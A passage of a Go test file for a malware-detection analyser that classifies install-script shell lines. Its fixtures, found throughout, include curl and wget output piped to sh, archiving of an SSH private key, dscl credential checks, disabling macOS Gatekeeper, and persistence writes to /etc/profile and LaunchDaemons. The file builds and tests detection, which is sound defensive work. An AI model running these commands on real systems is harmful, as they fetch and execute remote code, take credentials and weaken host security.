		{line: `curl -sXhead https://head-clustered.example/p | sh`},
		{line: `curl https://redirect.example/p > /tmp/body | sh`},
		{line: `curl https://redirect.example/p 1>/tmp/body | sh`},
		{line: `curl https://redirect.example/p &>/tmp/body | sh`},
		{line: `curl -XHEAD https://head.example/p | sh`},
		{line: `curl -X HEAD https://head.example/p | sh`},
		{line: `curl --request=HEAD https://head.example/p | sh`},
	}
	for _, test := range tests {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, test.line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if got := hasRelationKind(graph.Relations, behavior.RelationPipesTo); got != test.wantChain {
			t.Fatalf("%q chain=%v, want %v: %#v", test.line, got, test.wantChain, graph.Relations)
		}
	}
}

func TestDownloaderOptionValuesAreNotRequestOperands(t *testing.T) {
	for _, test := range []struct {
		line        string
		wantPartial bool
	}{
		{line: `curl -m 5 | sh`},
		{line: `curl --retry 5 | sh`},
		{line: `curl -b cookies.txt | sh`},
		{line: `wget -t 5 | sh`},
		{line: `curl --future-option value https://ambiguous.example/p | sh`, wantPartial: true},
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, test.line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
			t.Fatalf("option-only or ambiguous downloader %q produced request behavior: %#v", test.line, graph)
		}
		if test.wantPartial && !hasPartialCoverageScope(graph.Coverage, "shell-network-analysis") {
			t.Fatalf("ambiguous downloader %q lacks partial network coverage: %#v", test.line, graph.Coverage)
		}
	}
}

func TestDownloaderConfigKeepsRequestButNotProvenPipeRelation(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `curl -K curl.conf https://config.example/p | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Network) != 1 || !hasNetworkOperationDestination(graph, "https://config.example/p") {
		t.Fatalf("explicit request next to curl config was lost: %#v", graph.Network)
	}
	if hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("curl config overclaimed a fixed stdout pipe relation: %#v", graph.Relations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("curl config pipeline lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestDownloaderStrictOptionsPreserveCommonStdoutForms(t *testing.T) {
	for _, line := range []string{
		`curl -m 5 https://curl-option.example/p | sh`,
		`wget -t 5 -O - https://wget-option.example/p | sh`,
		`wget -qO- https://wget-combined.example/p | sh`,
		`curl -so- https://curl-combined.example/p | sh`,
	} {
		var graph behavior.Graph
		content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
		AnalyzeShellLine(&graph, content, line, 1, testConnectedExecution("root-0001"), "ev-0001")
		if countRelationKind(graph.Relations, behavior.RelationPipesTo) != 1 || len(graph.Network) != 1 {
			t.Fatalf("valid downloader options %q lost pipe execution: relations=%#v network=%#v coverage=%#v", line, graph.Relations, graph.Network, graph.Coverage)
		}
	}
}

func assertShellOperation(t *testing.T, graph behavior.Graph, kind behavior.OperationKind, category, concrete string) {
	t.Helper()
	for _, operation := range graph.Operations {
		if operation.Kind == kind && testOperationHasResource(operation, category, concrete) {
			return
		}
	}
	t.Fatalf("missing operation %s %s %s: %#v", kind, category, concrete, graph.Operations)
}

func TestAnalyzeShellLineBase64VariablePipelineIsNotDecoded(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `echo "$PAYLOAD" | base64 -D | sh`, 1, testConnectedExecution("root-0001"), "ev-0001")
	if len(graph.Operations) != 1 || graph.Operations[0].Kind != "interpreter.invoke" || graph.Operations[0].RequiredResource().Value != "sh" {
		t.Fatalf("only the real shell invocation should be retained: %#v", graph.Operations)
	}
	if len(graph.Network) != 0 || len(graph.Features) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("dynamic base64 input should not be decoded: network=%#v features=%#v relations=%#v", graph.Network, graph.Features, graph.Relations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "shell-analysis") {
		t.Fatalf("dynamic base64 pipeline lacks partial coverage: %#v", graph.Coverage)
	}
}

func TestAnalyzeShellLineRequiresExactSecurityCommandFields(t *testing.T) {
	tests := []struct {
		name     string
		line     string
		wantKind string
	}{
		{
			name:     "dscl authonly",
			line:     `dscl . authonly "$USER" secret`,
			wantKind: "credential.validate",
		},
		{
			name: "dscl substring",
			line: `dscl . notauthonly "$USER" secret`,
		},
		{
			name: "dscl authonly operand to read",
			line: `dscl . -read authonly`,
		},
		{
			name: "dscl authonly operand to create",
			line: `dscl . -create /Users/example authonly value`,
		},
		{
			name:     "dscl authonly after global option",
			line:     `dscl -u analyst . -authonly "$USER" secret`,
			wantKind: "credential.validate",
		},
		{
			name:     "spctl master disable",
			line:     `spctl --master-disable`,
			wantKind: "gatekeeper.configuration.modify",
		},
		{
			name: "spctl substring",
			line: `spctl --not--master-disable`,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
			AnalyzeShellLine(&graph, content, tt.line, 1, testConnectedExecution("root-0001"), "ev-0001")
			if tt.wantKind == "" {
				if len(graph.Operations) != 0 {
					t.Fatalf("unexpected operation from substring match: %#v", graph.Operations)
				}
				return
			}
			for _, operation := range graph.Operations {
				if operation.Kind == behavior.OperationKind(tt.wantKind) {
					return
				}
			}
			t.Fatalf("missing operation %q: %#v", tt.wantKind, graph.Operations)
		})
	}
}

func TestDSCLValidationKeepsMechanismOutOfPasswordResource(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `dscl . authonly analyst secret`, 1, testConnectedExecution("root-0001"), "ev-0001")
	for _, operation := range graph.Operations {
		if operation.Kind != "credential.validate" {
			continue
		}
		if operation.RequiredResource().Kind != behavior.ResourceCredential || operation.RequiredResource().Value != "" {
			t.Fatalf("credential resource should represent a password type, not a command: %#v", operation)
		}
		if operation.Qualifiers["mechanism"] != "dscl authonly" {
			t.Fatalf("authentication mechanism missing from qualifier: %#v", operation)
		}
		return
	}
	t.Fatalf("missing credential.validate operation: %#v", graph.Operations)
}

func TestAnalyzeShellLineArchiveOptionValuesAreNotSensitiveSources(t *testing.T) {
	tests := []struct {
		name    string
		line    string
		archive string
	}{
		{
			name:    "tar exclude",
			line:    `tar --exclude ~/.ssh/id_rsa -czf /tmp/out.tgz /tmp/src`,
			archive: "/tmp/out.tgz",
		},
		{
			name:    "tar exclude from",
			line:    `tar --exclude-from ~/.ssh/id_rsa -czf /tmp/out.tgz /tmp/src`,
			archive: "/tmp/out.tgz",
		},
		{
			name:    "zip exclude",
			line:    `zip -r /tmp/out.zip /tmp/src -x ~/.ssh/id_rsa`,
			archive: "/tmp/out.zip",
		},
		{
			name:    "zip password",
			line:    `zip -P ~/.ssh/id_rsa /tmp/out.zip /tmp/src`,
			archive: "/tmp/out.zip",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
			AnalyzeShellLine(&graph, content, tt.line, 1, testConnectedExecution("root-0001"), "ev-0001")
			assertShellOperation(t, graph, "archive.create", "archive", tt.archive)
			for _, operation := range graph.Operations {
				if operation.Kind == "file.read" && operation.RequiredResource().HasClassification(behavior.ResourceClassSSHPrivateKey) {
					t.Fatalf("archive option value should not become sensitive source: %#v", graph.Operations)
				}
			}
		})
	}
}

func TestAnalyzeShellLineOldStyleTarOptions(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
	AnalyzeShellLine(&graph, content, `tar czf /tmp/keys.tgz ~/.ssh/id_rsa`, 1, testConnectedExecution("root-0001"), "ev-0001")
	assertShellOperation(t, graph, "archive.create", "archive", "/tmp/keys.tgz")
	assertShellOperation(t, graph, "file.read", "ssh-private-key", "~/.ssh/id_rsa")
}

func TestAnalyzeShellLineArchiveExtractionUsesSharedTypedOperation(t *testing.T) {
	for _, test := range []struct {
		name               string
		line               string
		source             string
		target             string
		destinationBinding string
	}{
		{name: "tar", line: `tar -xzf /tmp/stage.tgz -C /tmp/stage`, source: "/tmp/stage.tgz", target: "/tmp/stage", destinationBinding: "exact-static"},
		{name: "ditto", line: `ditto -xk /tmp/stage.zip /tmp/stage`, source: "/tmp/stage.zip", target: "/tmp/stage", destinationBinding: "exact-static"},
		{name: "unzip", line: `unzip -qo /tmp/stage.zip -d /tmp/stage`, source: "/tmp/stage.zip", target: "/tmp/stage", destinationBinding: "exact-static"},
		{name: "unzip default cwd", line: `unzip /tmp/stage.zip`, source: "/tmp/stage.zip", destinationBinding: "runtime-working-directory"},
		{name: "unzip dynamic destination", line: `unzip /tmp/stage.zip -d "$OUT"`, source: "/tmp/stage.zip", destinationBinding: "unresolved"},
		{name: "tar ambiguous destinations", line: `tar -xf /tmp/stage.tar -C /tmp/one -C /tmp/two`, source: "/tmp/stage.tar", destinationBinding: "unresolved"},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
			AnalyzeShellLine(&graph, content, test.line, 1, testConnectedExecution("root-0001"), "ev-0001")
			if len(graph.Operations) != 1 || graph.Operations[0].Kind != behavior.OperationArchiveExtract {
				t.Fatalf("archive extraction did not emit one shared operation: %#v", graph.Operations)
			}
			source, ok := graph.Operations[0].FirstBinding(behavior.ResourceRoleSource)
			if !ok || source.Resource.Value != test.source || !source.Resource.HasClassification(behavior.ResourceClassArchive) {
				t.Fatalf("archive source binding = %#v, want %q classified archive", source, test.source)
			}
			target, ok := graph.Operations[0].FirstBinding(behavior.ResourceRoleLocalOutput)
			if !ok || target.Resource.Value != test.target {
				t.Fatalf("archive destination binding = %#v, want %q", target, test.target)
			}
			if got := graph.Operations[0].Qualifiers["destination_binding"]; got != test.destinationBinding {
				t.Fatalf("archive destination qualifier = %q, want %q: %#v", got, test.destinationBinding, graph.Operations[0])
			}
		})
	}
}

func TestAnalyzeShellLineArchiveParsingReportsOnlyUnsupportedSyntaxAsPartial(t *testing.T) {
	for _, test := range []struct {
		name        string
		line        string
		wantPartial bool
	}{
		{name: "unsupported tar option", line: `tar --no-mac-metadata -cf /tmp/out.tar src`, wantPartial: true},
		{name: "unsupported zip option", line: `zip --definitely-unknown /tmp/out.zip src`, wantPartial: true},
		{name: "malformed tar value", line: `tar -cf /tmp/out.tar src --format`},
		{name: "malformed zip value", line: `zip /tmp/out.zip src -P`},
		{name: "malformed ditto value", line: `ditto -c src /tmp/out.cpio --arch`},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
			AnalyzeShellLine(&graph, content, test.line, 1, testConnectedExecution("root-0001"), "ev-0001")
			if len(graph.Operations) != 0 {
				t.Fatalf("fail-closed archive parsing emitted operations: %#v", graph.Operations)
			}
			if got := hasPartialCoverageScope(graph.Coverage, "shell-archive-analysis"); got != test.wantPartial {
				t.Fatalf("shell-archive-analysis partial = %t, want %t: %#v", got, test.wantPartial, graph.Coverage)
			}
		})
	}
}

func assertStringSlice(t *testing.T, got, want []string) {
	t.Helper()
	if len(got) != len(want) {
		t.Fatalf("got %#v, want %#v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("got %#v, want %#v", got, want)
		}
	}
}

func TestShellPersistencePathsPreserveLiteralFilenameBytes(t *testing.T) {
	for _, test := range []struct {
		name string
		line string
		kind behavior.OperationKind
		want bool
	}{
		{"profile", `echo x > '/etc/profile'`, behavior.OperationShellProfileModify, true},
		{"profile trailing space", `echo x > '/etc/profile '`, behavior.OperationShellProfileModify, false},
		{"profile literal quote", `echo x > "/etc/profile'"`, behavior.OperationShellProfileModify, false},
		{"ordinary file", `echo x > '/tmp/profile'`, behavior.OperationShellProfileModify, false},
		{"malformed profile", `echo x > "/etc/profile`, behavior.OperationShellProfileModify, false},
		{"launchd", `cp /tmp/job.plist '/Library/LaunchDaemons/com.example.job.plist'`, behavior.OperationLaunchdJobInstall, true},
		{"launchd trailing space", `cp /tmp/job.plist '/Library/LaunchDaemons/com.example.job.plist '`, behavior.OperationLaunchdJobInstall, false},
		{"launchd literal quote", `cp /tmp/job.plist "/Library/LaunchDaemons/com.example.job.plist'"`, behavior.OperationLaunchdJobInstall, false},
		{"staged plist", `cp /tmp/job.plist '/tmp/com.example.job.plist'`, behavior.OperationLaunchdJobInstall, false},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", ScopeID: "scope-1", LogicalPath: "install.sh"}
			AnalyzeShellLine(&graph, content, test.line, 7, testConnectedExecution("root-1"), "ev-line")
			found := false
			for _, operation := range graph.Operations {
				if operation.Kind != test.kind {
					continue
				}
				found = true
				if operation.SubjectNodeID != "node-1" || operation.ScopeID != "scope-1" || operation.Line != 7 || operation.Execution.Connectivity != behavior.ConnectivityConnected || len(operation.EvidenceIDs) == 0 {
					t.Fatalf("persistence operation lost source lineage: %#v", operation)
				}
			}
			if found != test.want {
				t.Fatalf("persistence operation present=%v, want %v: %#v", found, test.want, graph.Operations)
			}
		})
	}
}

func TestShellDoesNotExecuteEmptyArgvOrSudoQueryOperands(t *testing.T) {
	for _, test := range []struct {
		line        string
		wantPartial bool
	}{
		{`"" curl https://example.invalid/payload`, false},
		{`sudo '' /usr/bin/id`, false},
		{`sudo -l curl https://example.invalid/payload`, true},
		{`sudo -e /usr/bin/id`, true},
		{`sudo --version /usr/bin/id`, true},
		{`sudo -l curl https://example.invalid/payload | sh`, true},
	} {
		t.Run(test.line, func(t *testing.T) {
			var graph behavior.Graph
			content := artifact.Content{NodeID: "node-1", ScopeID: "scope-1", LogicalPath: "install.sh"}
			AnalyzeShellLine(&graph, content, test.line, 1, testConnectedExecution("root-1"), "ev-line")
			if len(graph.Operations) != 0 {
				t.Fatalf("non-executed operand produced operations: %#v", graph.Operations)
			}
			if got := hasPartialCoverageScope(graph.Coverage, "shell-analysis"); got != test.wantPartial {
				t.Fatalf("shell-analysis partial=%v, want %v: %#v", got, test.wantPartial, graph.Coverage)
			}
		})
	}
}
